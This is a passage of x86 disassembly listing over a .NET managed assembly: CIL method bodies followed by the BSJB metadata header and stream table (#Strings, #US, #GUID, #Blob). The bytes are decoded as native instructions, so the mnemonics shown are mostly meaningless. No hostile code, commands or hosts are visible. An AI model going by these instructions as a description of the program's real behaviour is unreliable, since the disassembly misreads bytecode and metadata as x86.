  405752:	00 06                	add    %al,(%esi)
  405754:	0a 02                	or     (%edx),%al
  405756:	06                   	push   %es
  405757:	16                   	push   %ss
  405758:	06                   	push   %es
  405759:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40575c:	4c                   	dec    %esp
  40575d:	00 00                	add    %al,(%eax)
  40575f:	0a 02                	or     (%edx),%al
  405761:	03 16                	add    (%esi),%edx
  405763:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  405769:	00 0a                	add    %cl,(%edx)
  40576b:	2a 13                	sub    (%ebx),%dl
  40576d:	30 04 00             	xor    %al,(%eax,%eax,1)
  405770:	21 00                	and    %eax,(%eax)
  405772:	00 00                	add    %al,(%eax)
  405774:	29 00                	sub    %eax,(%eax)
  405776:	00 11                	add    %dl,(%ecx)
  405778:	02 20                	add    (%eax),%ah
  40577a:	cf                   	iret
  40577b:	00 00                	add    %al,(%eax)
  40577d:	00 6f ee             	add    %ch,-0x12(%edi)
  405780:	00 00                	add    %al,(%eax)
  405782:	0a 03                	or     (%ebx),%al
  405784:	28 09                	sub    %cl,(%ecx)
  405786:	01 00                	add    %eax,(%eax)
  405788:	0a 0a                	or     (%edx),%cl
  40578a:	02 06                	add    (%esi),%al
  40578c:	28 58 00             	sub    %bl,0x0(%eax)
  40578f:	00 06                	add    %al,(%esi)
  405791:	16                   	push   %ss
  405792:	1e                   	push   %ds
  405793:	6f                   	outsl  %ds:(%esi),(%dx)
  405794:	4c                   	dec    %esp
  405795:	00 00                	add    %al,(%eax)
  405797:	0a 2a                	or     (%edx),%ch
  405799:	00 00                	add    %al,(%eax)
  40579b:	00 13                	add    %dl,(%ebx)
  40579d:	30 04 00             	xor    %al,(%eax,%eax,1)
  4057a0:	35 01 00 00 00       	xor    $0x1,%eax
  4057a5:	00 00                	add    %al,(%eax)
  4057a7:	00 03                	add    %al,(%ebx)
  4057a9:	16                   	push   %ss
  4057aa:	6a 3f                	push   $0x3f
  4057ac:	96                   	xchg   %eax,%esi
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 03                	add    %al,(%ebx)
  4057b1:	1f                   	pop    %ds
  4057b2:	7f 6a                	jg     0x40581e
  4057b4:	3d 09 00 00 00       	cmp    $0x9,%eax
  4057b9:	02 03                	add    (%ebx),%al
  4057bb:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4057be:	00 00                	add    %al,(%eax)
  4057c0:	0a 2a                	or     (%edx),%ch
  4057c2:	03 20                	add    (%eax),%esp
  4057c4:	ff 00                	incl   (%eax)
  4057c6:	00 00                	add    %al,(%eax)
  4057c8:	6a 3d                	push   $0x3d
  4057ca:	14 00                	adc    $0x0,%al
  4057cc:	00 00                	add    %al,(%eax)
  4057ce:	02 20                	add    (%eax),%ah
  4057d0:	cc                   	int3
  4057d1:	00 00                	add    %al,(%eax)
  4057d3:	00 6f ee             	add    %ch,-0x12(%edi)
  4057d6:	00 00                	add    %al,(%eax)
  4057d8:	0a 02                	or     (%edx),%al
  4057da:	03 d2                	add    %edx,%edx
  4057dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4057dd:	ee                   	out    %al,(%dx)
  4057de:	00 00                	add    %al,(%eax)
  4057e0:	0a 2a                	or     (%edx),%ch
  4057e2:	03 20                	add    (%eax),%esp
  4057e4:	ff                   	(bad)
  4057e5:	ff 00                	incl   (%eax)
  4057e7:	00 6a 3d             	add    %ch,0x3d(%edx)
  4057ea:	1b 00                	sbb    (%eax),%eax
  4057ec:	00 00                	add    %al,(%eax)
  4057ee:	02 20                	add    (%eax),%ah
  4057f0:	cd 00                	int    $0x0
  4057f2:	00 00                	add    %al,(%eax)
  4057f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4057f5:	ee                   	out    %al,(%dx)
  4057f6:	00 00                	add    %al,(%eax)
  4057f8:	0a 02                	or     (%edx),%al
  4057fa:	03 68 28             	add    0x28(%eax),%ebp
  4057fd:	5b                   	pop    %ebx
  4057fe:	00 00                	add    %al,(%eax)
  405800:	06                   	push   %es
  405801:	16                   	push   %ss
  405802:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  405805:	00 00                	add    %al,(%eax)
  405807:	0a 2a                	or     (%edx),%ch
  405809:	03 15 6e 3d 1b 00    	add    0x1b3d6e,%edx
  40580f:	00 00                	add    %al,(%eax)
  405811:	02 20                	add    (%eax),%ah
  405813:	ce                   	into
  405814:	00 00                	add    %al,(%eax)
  405816:	00 6f ee             	add    %ch,-0x12(%edi)
  405819:	00 00                	add    %al,(%eax)
  40581b:	0a 02                	or     (%edx),%al
  40581d:	03 69 28             	add    0x28(%ecx),%ebp
  405820:	5a                   	pop    %edx
  405821:	00 00                	add    %al,(%eax)
  405823:	06                   	push   %es
  405824:	16                   	push   %ss
  405825:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405828:	00 00                	add    %al,(%eax)
  40582a:	0a 2a                	or     (%edx),%ch
  40582c:	02 20                	add    (%eax),%ah
  40582e:	d3 00                	roll   %cl,(%eax)
  405830:	00 00                	add    %al,(%eax)
  405832:	6f                   	outsl  %ds:(%esi),(%dx)
  405833:	ee                   	out    %al,(%dx)
  405834:	00 00                	add    %al,(%eax)
  405836:	0a 02                	or     (%edx),%al
  405838:	03 28                	add    (%eax),%ebp
  40583a:	59                   	pop    %ecx
  40583b:	00 00                	add    %al,(%eax)
  40583d:	06                   	push   %es
  40583e:	16                   	push   %ss
  40583f:	1e                   	push   %ds
  405840:	6f                   	outsl  %ds:(%esi),(%dx)
  405841:	4c                   	dec    %esp
  405842:	00 00                	add    %al,(%eax)
  405844:	0a 2a                	or     (%edx),%ch
  405846:	03 20                	add    (%eax),%esp
  405848:	00 00                	add    %al,(%eax)
  40584a:	00 80 6a 3d 1a 00    	add    %al,0x1a3d6a(%eax)
  405850:	00 00                	add    %al,(%eax)
  405852:	02 20                	add    (%eax),%ah
  405854:	d3 00                	roll   %cl,(%eax)
  405856:	00 00                	add    %al,(%eax)
  405858:	6f                   	outsl  %ds:(%esi),(%dx)
  405859:	ee                   	out    %al,(%dx)
  40585a:	00 00                	add    %al,(%eax)
  40585c:	0a 02                	or     (%edx),%al
  40585e:	03 28                	add    (%eax),%ebp
  405860:	59                   	pop    %ecx
  405861:	00 00                	add    %al,(%eax)
  405863:	06                   	push   %es
  405864:	16                   	push   %ss
  405865:	1e                   	push   %ds
  405866:	6f                   	outsl  %ds:(%esi),(%dx)
  405867:	4c                   	dec    %esp
  405868:	00 00                	add    %al,(%eax)
  40586a:	0a 2a                	or     (%edx),%ch
  40586c:	03 20                	add    (%eax),%esp
  40586e:	00 80 ff ff 6a 3d    	add    %al,0x3d6affff(%eax)
  405874:	1b 00                	sbb    (%eax),%eax
  405876:	00 00                	add    %al,(%eax)
  405878:	02 20                	add    (%eax),%ah
  40587a:	d2 00                	rolb   %cl,(%eax)
  40587c:	00 00                	add    %al,(%eax)
  40587e:	6f                   	outsl  %ds:(%esi),(%dx)
  40587f:	ee                   	out    %al,(%dx)
  405880:	00 00                	add    %al,(%eax)
  405882:	0a 02                	or     (%edx),%al
  405884:	03 69 28             	add    0x28(%ecx),%ebp
  405887:	5a                   	pop    %edx
  405888:	00 00                	add    %al,(%eax)
  40588a:	06                   	push   %es
  40588b:	16                   	push   %ss
  40588c:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40588f:	00 00                	add    %al,(%eax)
  405891:	0a 2a                	or     (%edx),%ch
  405893:	03 1f                	add    (%edi),%ebx
  405895:	80 6a 3d 1b          	subb   $0x1b,0x3d(%edx)
  405899:	00 00                	add    %al,(%eax)
  40589b:	00 02                	add    %al,(%edx)
  40589d:	20 d1                	and    %dl,%cl
  40589f:	00 00                	add    %al,(%eax)
  4058a1:	00 6f ee             	add    %ch,-0x12(%edi)
  4058a4:	00 00                	add    %al,(%eax)
  4058a6:	0a 02                	or     (%edx),%al
  4058a8:	03 68 28             	add    0x28(%eax),%ebp
  4058ab:	5b                   	pop    %ebx
  4058ac:	00 00                	add    %al,(%eax)
  4058ae:	06                   	push   %es
  4058af:	16                   	push   %ss
  4058b0:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4058b3:	00 00                	add    %al,(%eax)
  4058b5:	0a 2a                	or     (%edx),%ch
  4058b7:	03 1f                	add    (%edi),%ebx
  4058b9:	e0 6a                	loopne 0x405925
  4058bb:	3d 14 00 00 00       	cmp    $0x14,%eax
  4058c0:	02 20                	add    (%eax),%ah
  4058c2:	d0 00                	rolb   $1,(%eax)
  4058c4:	00 00                	add    %al,(%eax)
  4058c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4058c7:	ee                   	out    %al,(%dx)
  4058c8:	00 00                	add    %al,(%eax)
  4058ca:	0a 02                	or     (%edx),%al
  4058cc:	03 d2                	add    %edx,%edx
  4058ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4058cf:	ee                   	out    %al,(%dx)
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	0a 2a                	or     (%edx),%ch
  4058d4:	02 03                	add    (%ebx),%al
  4058d6:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4058d9:	00 00                	add    %al,(%eax)
  4058db:	0a 2a                	or     (%edx),%ch
  4058dd:	00 00                	add    %al,(%eax)
  4058df:	00 1b                	add    %bl,(%ebx)
  4058e1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4058e4:	61                   	popa
  4058e5:	00 00                	add    %al,(%eax)
  4058e7:	00 2d 00 00 11 02    	add    %ch,0x2110000
  4058ed:	73 4d                	jae    0x40593c
  4058ef:	00 00                	add    %al,(%eax)
  4058f1:	0a 0a                	or     (%edx),%cl
  4058f3:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  4058f9:	0b 06                	or     (%esi),%eax
  4058fb:	07                   	pop    %es
  4058fc:	16                   	push   %ss
  4058fd:	1a 6f 45             	sbb    0x45(%edi),%ch
  405900:	00 00                	add    %al,(%eax)
  405902:	0a 26                	or     (%esi),%ah
  405904:	07                   	pop    %es
  405905:	16                   	push   %ss
  405906:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40590a:	0a 0c 06             	or     (%esi,%eax,1),%cl
  40590d:	16                   	push   %ss
  40590e:	73 0a                	jae    0x40591a
  405910:	01 00                	add    %eax,(%eax)
  405912:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  405918:	00 01                	add    %al,(%ecx)
  40591a:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  40591d:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405920:	08 6f 45             	or     %ch,0x45(%edi)
  405923:	00 00                	add    %al,(%eax)
  405925:	0a 26                	or     (%esi),%ah
  405927:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40592a:	05 dd 1a 00 00       	add    $0x1add,%eax
  40592f:	00 09                	add    %cl,(%ecx)
  405931:	39 06                	cmp    %eax,(%esi)
  405933:	00 00                	add    %al,(%eax)
  405935:	00 09                	add    %cl,(%ecx)
  405937:	6f                   	outsl  %ds:(%esi),(%dx)
  405938:	33 00                	xor    (%eax),%eax
  40593a:	00 0a                	add    %cl,(%edx)
  40593c:	dc 06                	faddl  (%esi)
  40593e:	39 06                	cmp    %eax,(%esi)
  405940:	00 00                	add    %al,(%eax)
  405942:	00 06                	add    %al,(%esi)
  405944:	6f                   	outsl  %ds:(%esi),(%dx)
  405945:	33 00                	xor    (%eax),%eax
  405947:	00 0a                	add    %cl,(%edx)
  405949:	dc 11                	fcoml  (%ecx)
  40594b:	05 2a 00 00 00       	add    $0x2a,%eax
  405950:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  405953:	00 02                	add    %al,(%edx)
  405955:	00 28                	add    %ch,(%eax)
  405957:	00 1c 44             	add    %bl,(%esp,%eax,2)
  40595a:	00 0d 00 00 00 00    	add    %cl,0x0
  405960:	02 00                	add    (%eax),%al
  405962:	07                   	pop    %es
  405963:	00 4a 51             	add    %cl,0x51(%edx)
  405966:	00 0d 00 00 00 00    	add    %cl,0x0
  40596c:	1b 30                	sbb    (%eax),%esi
  40596e:	04 00                	add    $0x0,%al
  405970:	5e                   	pop    %esi
  405971:	00 00                	add    %al,(%eax)
  405973:	00 2e                	add    %ch,(%esi)
  405975:	00 00                	add    %al,(%eax)
  405977:	11 73 d0             	adc    %esi,-0x30(%ebx)
  40597a:	00 00                	add    %al,(%eax)
  40597c:	0a 0a                	or     (%edx),%cl
  40597e:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  405984:	00 0a                	add    %cl,(%edx)
  405986:	0b 06                	or     (%esi),%eax
  405988:	07                   	pop    %es
  405989:	16                   	push   %ss
  40598a:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40598d:	00 00                	add    %al,(%eax)
  40598f:	0a 06                	or     (%esi),%al
  405991:	17                   	pop    %ss
  405992:	73 0a                	jae    0x40599e
  405994:	01 00                	add    %eax,(%eax)
  405996:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  405999:	02 16                	add    (%esi),%dl
  40599b:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4059a1:	00 0a                	add    %cl,(%edx)
  4059a3:	08 6f 4f             	or     %ch,0x4f(%edi)
  4059a6:	00 00                	add    %al,(%eax)
  4059a8:	0a dd                	or     %ch,%bl
  4059aa:	0d 00 00 00 08       	or     $0x8000000,%eax
  4059af:	39 06                	cmp    %eax,(%esi)
  4059b1:	00 00                	add    %al,(%eax)
  4059b3:	00 08                	add    %cl,(%eax)
  4059b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4059b6:	33 00                	xor    (%eax),%eax
  4059b8:	00 0a                	add    %cl,(%edx)
  4059ba:	dc 06                	faddl  (%esi)
  4059bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4059bd:	dd 00                	fldl   (%eax)
  4059bf:	00 0a                	add    %cl,(%edx)
  4059c1:	0d dd 0d 00 00       	or     $0xddd,%eax
  4059c6:	00 06                	add    %al,(%esi)
  4059c8:	39 06                	cmp    %eax,(%esi)
  4059ca:	00 00                	add    %al,(%eax)
  4059cc:	00 06                	add    %al,(%esi)
  4059ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4059cf:	33 00                	xor    (%eax),%eax
  4059d1:	00 0a                	add    %cl,(%edx)
  4059d3:	dc 09                	fmull  (%ecx)
  4059d5:	2a 00                	sub    (%eax),%al
  4059d7:	00 01                	add    %al,(%ecx)
  4059d9:	1c 00                	sbb    $0x0,%al
  4059db:	00 02                	add    %al,(%edx)
  4059dd:	00 20                	add    %ah,(%eax)
  4059df:	00 16                	add    %dl,(%esi)
  4059e1:	36 00 0d 00 00 00 00 	add    %cl,%ss:0x0
  4059e8:	02 00                	add    (%eax),%al
  4059ea:	06                   	push   %es
  4059eb:	00 49 4f             	add    %cl,0x4f(%ecx)
  4059ee:	00 0d 00 00 00 00    	add    %cl,0x0
  4059f4:	42                   	inc    %edx
  4059f5:	53                   	push   %ebx
  4059f6:	4a                   	dec    %edx
  4059f7:	42                   	inc    %edx
  4059f8:	01 00                	add    %eax,(%eax)
  4059fa:	01 00                	add    %eax,(%eax)
  4059fc:	00 00                	add    %al,(%eax)
  4059fe:	00 00                	add    %al,(%eax)
  405a00:	0c 00                	or     $0x0,%al
  405a02:	00 00                	add    %al,(%eax)
  405a04:	76 34                	jbe    0x405a3a
  405a06:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405a09:	33 30                	xor    (%eax),%esi
  405a0b:	33 31                	xor    (%ecx),%esi
  405a0d:	39 00                	cmp    %eax,(%eax)
  405a0f:	00 00                	add    %al,(%eax)
  405a11:	00 05 00 6c 00 00    	add    %al,0x6c00
  405a17:	00 bc 1d 00 00 23 7e 	add    %bh,0x7e230000(%ebp,%ebx,1)
  405a1e:	00 00                	add    %al,(%eax)
  405a20:	28 1e                	sub    %bl,(%esi)
  405a22:	00 00                	add    %al,(%eax)
  405a24:	f0 26 00 00          	lock add %al,%es:(%eax)
  405a28:	23 53 74             	and    0x74(%ebx),%edx
  405a2b:	72 69                	jb     0x405a96
  405a2d:	6e                   	outsb  %ds:(%esi),(%dx)
  405a2e:	67 73 00             	addr16 jae 0x405a31
  405a31:	00 00                	add    %al,(%eax)
  405a33:	00 18                	add    %bl,(%eax)
  405a35:	45                   	inc    %ebp
  405a36:	00 00                	add    %al,(%eax)
  405a38:	84 28                	test   %ch,(%eax)
  405a3a:	00 00                	add    %al,(%eax)
  405a3c:	23 55 53             	and    0x53(%ebp),%edx
  405a3f:	00 9c 6d 00 00 10 00 	add    %bl,0x100000(%ebp,%ebp,2)
  405a46:	00 00                	add    %al,(%eax)
  405a48:	23 47 55             	and    0x55(%edi),%eax
  405a4b:	49                   	dec    %ecx
  405a4c:	44                   	inc    %esp
  405a4d:	00 00                	add    %al,(%eax)
  405a4f:	00 ac 6d 00 00 40 09 	add    %ch,0x9400000(%ebp,%ebp,2)
  405a56:	00 00                	add    %al,(%eax)
  405a58:	23 42 6c             	and    0x6c(%edx),%eax
  405a5b:	6f                   	outsl  %ds:(%esi),(%dx)
  405a5c:	62 00                	bound  %eax,(%eax)
  405a5e:	00 00                	add    %al,(%eax)
  405a60:	00 00                	add    %al,(%eax)
  405a62:	00 00                	add    %al,(%eax)
  405a64:	02 00                	add    (%eax),%al
  405a66:	00 00                	add    %al,(%eax)
  405a68:	57                   	push   %edi
  405a69:	9f                   	lahf
  405a6a:	a2 3f 09 0a 00       	mov    %al,0xa093f
  405a6f:	00 00                	add    %al,(%eax)
  405a71:	fa                   	cli
  405a72:	25 33 00 16 00       	and    $0x160033,%eax
  405a77:	00 01                	add    %al,(%ecx)
  405a79:	00 00                	add    %al,(%eax)
  405a7b:	00 9b 00 00 00 1e    	add    %bl,0x1e000000(%ebx)
  405a81:	00 00                	add    %al,(%eax)
  405a83:	00 47 00             	add    %al,0x0(%edi)
  405a86:	00 00                	add    %al,(%eax)
  405a88:	a3 00 00 00 71       	mov    %eax,0x71000000
  405a8d:	00 00                	add    %al,(%eax)
  405a8f:	00 02                	add    %al,(%edx)
  405a91:	00 00                	add    %al,(%eax)
  405a93:	00 0a                	add    %cl,(%edx)
  405a95:	01 00                	add    %eax,(%eax)
  405a97:	00 13                	add    %dl,(%ebx)
  405a99:	00 00                	add    %al,(%eax)
  405a9b:	00 31                	add    %dh,(%ecx)
  405a9d:	00 00                	add    %al,(%eax)
  405a9f:	00 02                	add    %al,(%edx)
  405aa1:	00 00                	add    %al,(%eax)
  405aa3:	00 2e                	add    %ch,(%esi)
  405aa5:	00 00                	add    %al,(%eax)
  405aa7:	00 04 00             	add    %al,(%eax,%eax,1)
  405aaa:	00 00                	add    %al,(%eax)
  405aac:	13 00                	adc    (%eax),%eax
  405aae:	00 00                	add    %al,(%eax)
  405ab0:	20 00                	and    %al,(%eax)
  405ab2:	00 00                	add    %al,(%eax)
  405ab4:	04 00                	add    $0x0,%al
  405ab6:	00 00                	add    %al,(%eax)
  405ab8:	03 00                	add    (%eax),%eax
  405aba:	00 00                	add    %al,(%eax)
  405abc:	06                   	push   %es
  405abd:	00 00                	add    %al,(%eax)
  405abf:	00 06                	add    %al,(%esi)
  405ac1:	00 00                	add    %al,(%eax)
  405ac3:	00 02                	add    %al,(%edx)
  405ac5:	00 00                	add    %al,(%eax)
  405ac7:	00 01                	add    %al,(%ecx)
  405ac9:	00 00                	add    %al,(%eax)
  405acb:	00 08                	add    %cl,(%eax)
  405acd:	00 00                	add    %al,(%eax)
  405acf:	00 04 00             	add    %al,(%eax,%eax,1)
  405ad2:	00 00                	add    %al,(%eax)
  405ad4:	01 00                	add    %eax,(%eax)
  405ad6:	00 00                	add    %al,(%eax)
  405ad8:	00 00                	add    %al,(%eax)
  405ada:	6d                   	insl   (%dx),%es:(%edi)
  405adb:	0d 01 00 00 00       	or     $0x1,%eax
  405ae0:	00 00                	add    %al,(%eax)
  405ae2:	06                   	push   %es
  405ae3:	00 9f 21 df 18 0a    	add    %bl,0xa18df21(%edi)
  405ae9:	00 4c 00 a9          	add    %cl,-0x57(%eax,%eax,1)
  405aed:	1f                   	pop    %ds
  405aee:	0a 00                	or     (%eax),%al
  405af0:	db 21                	(bad) (%ecx)
  405af2:	19 21                	sbb    %esp,(%ecx)
  405af4:	0a 00                	or     (%eax),%al
  405af6:	86 18                	xchg   %bl,(%eax)
  405af8:	98                   	cwtl
  405af9:	26 06                	es push %es
  405afb:	00 f0                	add    %dh,%al
  405afd:	1d 2a 14 06 00       	sbb    $0x6142a,%eax
  405b02:	53                   	push   %ebx
  405b03:	10 a9 1f 0a 00 91    	adc    %ch,-0x6efff5e1(%ecx)
  405b09:	19 a9 1f 0a 00 e2    	sbb    %ebp,-0x1dfff5e1(%ecx)
  405b0f:	20 98 26 06 00 37    	and    %bl,0x37000626(%eax)
  405b15:	22 df                	and    %bh,%bl
  405b17:	18 0e                	sbb    %cl,(%esi)
  405b19:	00 17                	add    %dl,(%edi)
  405b1b:	1b 66 14             	sbb    0x14(%esi),%esp
  405b1e:	0e                   	push   %cs
  405b1f:	00 6d 21             	add    %ch,0x21(%ebp)
  405b22:	66 14 06             	data16 adc $0x6,%al
  405b25:	00 51 25             	add    %dl,0x25(%ecx)
  405b28:	2a 14 06             	sub    (%esi,%eax,1),%dl
  405b2b:	00 4f 1d             	add    %cl,0x1d(%edi)
  405b2e:	b0 23                	mov    $0x23,%al
  405b30:	06                   	push   %es
  405b31:	00 38                	add    %bh,(%eax)
  405b33:	19 df                	sbb    %ebx,%edi
  405b35:	18 0a                	sbb    %cl,(%edx)
  405b37:	00 32                	add    %dh,(%edx)
  405b39:	20 2b                	and    %ch,(%ebx)
  405b3b:	00 06                	add    %al,(%esi)
  405b3d:	00 24 00             	add    %ah,(%eax,%eax,1)
  405b40:	ed                   	in     (%dx),%eax
  405b41:	0a 12                	or     (%edx),%dl
  405b43:	00 19                	add    %bl,(%ecx)
  405b45:	00 41 1f             	add    %al,0x1f(%ecx)
  405b48:	12 00                	adc    (%eax),%al
  405b4a:	01 00                	add    %eax,(%eax)
  405b4c:	df 18                	fistps (%eax)
  405b4e:	12 00                	adc    (%eax),%al
  405b50:	89 10                	mov    %edx,(%eax)
  405b52:	41                   	inc    %ecx
  405b53:	1f                   	pop    %ds
  405b54:	06                   	push   %es
  405b55:	00 f4                	add    %dh,%ah
  405b57:	0f df 18             	pandn  (%eax),%mm3
  405b5a:	06                   	push   %es
  405b5b:	00 59 14             	add    %bl,0x14(%ecx)
  405b5e:	b0 23                	mov    $0x23,%al
  405b60:	06                   	push   %es
  405b61:	00 3d 1e 9c 20 06    	add    %bh,0x6209c1e
  405b67:	00 35 0e 9c 20 06    	add    %dh,0x6209c0e
  405b6d:	00 ae 18 21 06 06    	add    %ch,0x6062118(%esi)
  405b73:	00 96 11 41 1f 06    	add    %dl,0x61f4111(%esi)
  405b79:	00 03                	add    %al,(%ebx)
  405b7b:	12 41 1f             	adc    0x1f(%ecx),%al
  405b7e:	06                   	push   %es
  405b7f:	00 b3 10 f1 1e 6f    	add    %dh,0x6f1ef110(%ebx)
  405b85:	00 61 1f             	add    %ah,0x1f(%ecx)
  405b88:	00 00                	add    %al,(%eax)
  405b8a:	06                   	push   %es
  405b8b:	00 db                	add    %bl,%bl
  405b8d:	10 27                	adc    %ah,(%edi)
  405b8f:	1a 06                	sbb    (%esi),%al
  405b91:	00 62 11             	add    %ah,0x11(%edx)
  405b94:	27                   	daa
  405b95:	1a 06                	sbb    (%esi),%al
  405b97:	00 43 11             	add    %al,0x11(%ebx)
  405b9a:	27                   	daa
  405b9b:	1a 06                	sbb    (%esi),%al
  405b9d:	00 ea                	add    %ch,%dl
  405b9f:	11 27                	adc    %esp,(%edi)
  405ba1:	1a 06                	sbb    (%esi),%al
  405ba3:	00 b6 11 27 1a 06    	add    %dh,0x61a2711(%esi)
  405ba9:	00 cf                	add    %cl,%bh
  405bab:	11 27                	adc    %esp,(%edi)
  405bad:	1a 06                	sbb    (%esi),%al
  405baf:	00 f2                	add    %dh,%dl
  405bb1:	10 27                	adc    %ah,(%edi)
  405bb3:	1a 06                	sbb    (%esi),%al
  405bb5:	00 26                	add    %ah,(%esi)
  405bb7:	11 27                	adc    %esp,(%edi)
  405bb9:	1a 06                	sbb    (%esi),%al
  405bbb:	00 0d 11 7d 14 06    	add    %cl,0x6147d11
  405bc1:	00 c7                	add    %al,%bh
  405bc3:	10 22                	adc    %ah,(%edx)
  405bc5:	1f                   	pop    %ds
  405bc6:	06                   	push   %es
  405bc7:	00 98 10 41 1f 06    	add    %bl,0x61f4110(%eax)
  405bcd:	00 7f 11             	add    %bh,0x11(%edi)
  405bd0:	27                   	daa
  405bd1:	1a 06                	sbb    (%esi),%al
  405bd3:	00 c0                	add    %al,%al
  405bd5:	0b 2a                	or     (%edx),%ebp
  405bd7:	14 06                	adc    $0x6,%al
  405bd9:	00 70 23             	add    %dh,0x23(%eax)
  405bdc:	df 18                	fistps (%eax)
  405bde:	06                   	push   %es
  405bdf:	00 be 22 df 18 06    	add    %bh,0x618df22(%esi)
  405be5:	00 5d 14             	add    %bl,0x14(%ebp)
  405be8:	b0 23                	mov    $0x23,%al
  405bea:	0a 00                	or     (%eax),%al
  405bec:	b6 25                	mov    $0x25,%dh
  405bee:	a9 1f 06 00 f9       	test   $0xf900061f,%eax
  405bf3:	18 f3                	sbb    %dh,%bl
  405bf5:	25 06 00 1d 1d       	and    $0x1d1d0006,%eax
  405bfa:	f3 25 06 00 ff 13    	repz and $0x13ff0006,%eax
  405c00:	f3 25 06 00 b0 1a    	repz and $0x1ab00006,%eax
  405c06:	df 18                	fistps (%eax)
  405c08:	0a 00                	or     (%eax),%al
  405c0a:	0f 21 c9             	mov    %db1,%ecx
  405c0d:	21 0a                	and    %ecx,(%edx)
  405c0f:	00 55 22             	add    %dl,0x22(%ebp)
  405c12:	c9                   	leave
  405c13:	21 0a                	and    %ecx,(%edx)
  405c15:	00 b6 17 c9 21 0a    	add    %dh,0xa21c917(%esi)
  405c1b:	00 40 26             	add    %al,0x26(%eax)
  405c1e:	19 21                	sbb    %esp,(%ecx)
  405c20:	0a 00                	or     (%eax),%al
  405c22:	13 10                	adc    (%eax),%edx
  405c24:	19 21                	sbb    %esp,(%ecx)
  405c26:	0a 00                	or     (%eax),%al
  405c28:	fe 0f                	decb   (%edi)
  405c2a:	19 21                	sbb    %esp,(%ecx)
  405c2c:	06                   	push   %es
  405c2d:	00 ec                	add    %ch,%ah
  405c2f:	14 df                	adc    $0xdf,%al
  405c31:	18 06                	sbb    %al,(%esi)
  405c33:	00 f2                	add    %dh,%dl
  405c35:	1c df                	sbb    $0xdf,%al
  405c37:	18 06                	sbb    %al,(%esi)
  405c39:	00 20                	add    %ah,(%eax)
  405c3b:	19 df                	sbb    %ebx,%edi
  405c3d:	18 0a                	sbb    %cl,(%edx)
  405c3f:	00 8f 20 c9 21 0a    	add    %cl,0xa21c920(%edi)
  405c45:	00 49 20             	add    %cl,0x20(%ecx)
  405c48:	c9                   	leave
  405c49:	21 06                	and    %eax,(%esi)
  405c4b:	00 af 20 df 18 06    	add    %ch,0x618df20(%edi)
  405c51:	00 41 0e             	add    %al,0xe(%ecx)
  405c54:	df 18                	fistps (%eax)
  405c56:	0a 00                	or     (%eax),%al
  405c58:	78 18                	js     0x405c72
  405c5a:	19 21                	sbb    %esp,(%ecx)
  405c5c:	0a 00                	or     (%eax),%al
  405c5e:	c0 16 98             	rclb   $0x98,(%esi)
  405c61:	26 0a 00             	or     %es:(%eax),%al
  405c64:	25 23 c9 21 0a       	and    $0xa21c923,%eax
  405c69:	00 39                	add    %bh,(%ecx)
  405c6b:	1a a9 1f 0a 00 6d    	sbb    0x6d000a1f(%ecx),%ch
  405c71:	20 08                	and    %cl,(%eax)
  405c73:	1a 06                	sbb    (%esi),%al
  405c75:	00 43 12             	add    %al,0x12(%ebx)
  405c78:	df 18                	fistps (%eax)
  405c7a:	06                   	push   %es
  405c7b:	00 e4                	add    %ah,%ah
  405c7d:	16                   	push   %ss
  405c7e:	2a 14 06             	sub    (%esi,%eax,1),%dl
  405c81:	00 b2 16 df 18 0a    	add    %dh,0xa18df16(%edx)
  405c87:	00 01                	add    %al,(%ecx)
  405c89:	16                   	push   %ss
  405c8a:	df 18                	fistps (%eax)
  405c8c:	0a 00                	or     (%eax),%al
  405c8e:	e0 0f                	loopne 0x405c9f
  405c90:	df 18                	fistps (%eax)
  405c92:	06                   	push   %es
  405c93:	00 28                	add    %ch,(%eax)
  405c95:	1e                   	push   %ds
  405c96:	df 18                	fistps (%eax)
  405c98:	06                   	push   %es
  405c99:	00 57 23             	add    %dl,0x23(%edi)
  405c9c:	2a 14 06             	sub    (%esi,%eax,1),%dl
  405c9f:	00 a8 18 21 06 06    	add    %ch,0x6062118(%eax)
  405ca5:	00 a8 1e 2a 14 0a    	add    %ch,0xa142a1e(%eax)
  405cab:	00 06                	add    %al,(%esi)
  405cad:	0e                   	push   %cs
  405cae:	19 21                	sbb    %esp,(%ecx)
  405cb0:	06                   	push   %es
  405cb1:	00 70 01             	add    %dh,0x1(%eax)
  405cb4:	df 18                	fistps (%eax)
  405cb6:	06                   	push   %es
  405cb7:	00 26                	add    %ah,(%esi)
  405cb9:	1b 21                	sbb    (%ecx),%esp
  405cbb:	06                   	push   %es
  405cbc:	0a 00                	or     (%eax),%al
  405cbe:	07                   	pop    %es
  405cbf:	21 f1                	and    %esi,%ecx
  405cc1:	1e                   	push   %ds
  405cc2:	0a 00                	or     (%eax),%al
  405cc4:	68 1b f1 1e 06       	push   $0x61ef11b
  405cc9:	00 c0                	add    %al,%al
  405ccb:	25 2b 00 06 00       	and    $0x6002b,%eax
  405cd0:	0a 1e                	or     (%esi),%bl
  405cd2:	21 06                	and    %eax,(%esi)
